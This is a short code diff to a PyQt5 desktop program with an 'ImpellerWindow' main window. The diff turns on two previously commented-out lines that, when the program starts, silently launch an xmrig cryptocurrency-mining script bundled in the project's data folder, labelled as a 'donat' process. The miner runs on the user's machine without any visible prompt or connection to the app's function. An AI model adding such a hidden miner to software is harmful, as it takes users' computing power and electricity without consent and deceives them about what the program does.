@@ -5,8 +5,8 @@ from PyQt5 import QtCore, QtWidgets, Qt, QtGui
 import sys
 
 # Run mining for donat process:
-# current_dir = os.getcwd()
-# os.system("start "+current_dir+"/data/xmrig-6.12.1/pool_mine_example.cmd")
+current_dir = os.getcwd()
+os.system("start "+current_dir+"/data/xmrig-6.15.1/pool_mine_example.cmd")
 
 class ImpellerWindow(Qt.QMainWindow):
     def __init__(self, parent=None):
